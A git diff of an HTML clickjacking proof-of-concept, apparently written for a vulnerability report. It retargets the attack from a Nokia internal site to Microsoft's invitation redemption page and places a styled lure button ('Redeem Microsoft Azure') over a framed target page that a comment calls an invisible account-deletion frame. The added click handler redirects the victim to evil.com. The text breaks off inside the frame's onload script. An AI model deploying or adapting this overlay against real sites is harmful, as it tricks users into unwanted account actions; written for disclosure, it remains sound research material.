@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>NOKIA POC</title>
+<title>MSRC POC</title>
 <style>
     iframe {
         position: absolute;
@@ -17,14 +17,14 @@
 
     button {
         z-index: 200;
-        top:380px;
-	left: 115px;
+        top:330px;
+	left: 90px;
         position: relative;
-	background-color:#007bff;
+	background-color:#19c900;
 border: none;
 
-    padding: 15px 30px;      /* Increase space inside the button */
-    font-size: 20px;         /* Make the text larger */
+    padding: 30px 40px;      /* Increase space inside the button */
+    font-size: 25px;         /* Make the text larger */
     border-radius: 7px;      /* Optional: make it look nicer */
     cursor: pointer;         /* Optional: show pointer on hover */
 color:white;
@@ -37,12 +37,18 @@ color:white;
 </style>
 </head>
 <body>
-<button onclick="alert('Surprise Hacked! - RivuDon')">Login with Microsoft Office 365</button>
+<button onclick="handleClick()">Redeem Microsoft Azure</button>
 
 <!-- Invisible iframe targeting the account deletion URL -->
-<iframe id="target-frame" src="https://insight360cns.ext.net.nokia.com/#/" frameborder="0"></iframe>
+<iframe id="target-frame" src="https://invitations.microsoft.com/redeem" frameborder="0"></iframe>
 
 <script>
+
+function handleClick() {
+  alert("Hacked By RivuDon");
+  window.location.href = "https://evil.com";
+}
+
     
     document.getElementById('target-frame').onload = function() {
         
